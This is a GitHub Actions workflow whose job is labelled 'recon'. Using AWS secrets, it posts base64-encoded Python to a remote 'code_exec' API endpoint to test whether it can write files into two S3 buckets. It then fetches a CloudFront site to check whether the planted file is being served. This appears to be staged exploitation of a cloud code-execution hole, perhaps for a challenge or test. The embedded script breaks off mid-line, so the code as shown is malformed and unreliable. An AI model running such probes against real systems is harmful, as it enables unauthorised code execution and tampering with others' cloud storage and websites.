name: Stage2
on:
  push:
    branches: [corgi]

permissions:
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1
    steps:
      - name: Who am I
        run: aws sts get-caller-identity
        
      - name: Debug Lambda step by step
        run: |
          pip install requests requests-aws4auth --quiet
          python3 - << 'PYEOF'
          import boto3, base64, requests
          from requests_aws4auth import AWS4Auth
          
          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
          session = boto3.Session()
          creds = session.get_credentials().get_frozen_credentials()
          auth = AWS4Auth(creds.access_key, creds.secret_key, 'us-east-1', 'execute-api', session_token=creds.token)
          
          def run(label, code):
              r = requests.post(API, json={"code": base64.b64encode(code.encode()).decode()}, auth=auth)
              print(f"[{label}] {r.status_code} {r.text[:200]}")
          
          # נסה אחד אחד
          run("write_userad", "import boto3; boto3.client('s3',region_name='us-east-1').put_object(Bucket='userad88e2b168aa387e',Key='t.txt',Body=b'ok')")
          run("write_logad",  "import boto3; boto3.client('s3',region_name='us-east-1').put_object(Bucket='logad88e2b168aa387e',Key='t.txt',Body=b'ok')")
          run("list_buckets

      - name: Fetch test site
        run: |
          curl -s https://d4ysu55xg7wfi.cloudfront.net/
          echo "---"
          curl -s https://d4ysu55xg7wfi.cloudfront.net/t.txt 2>&1 | head -5
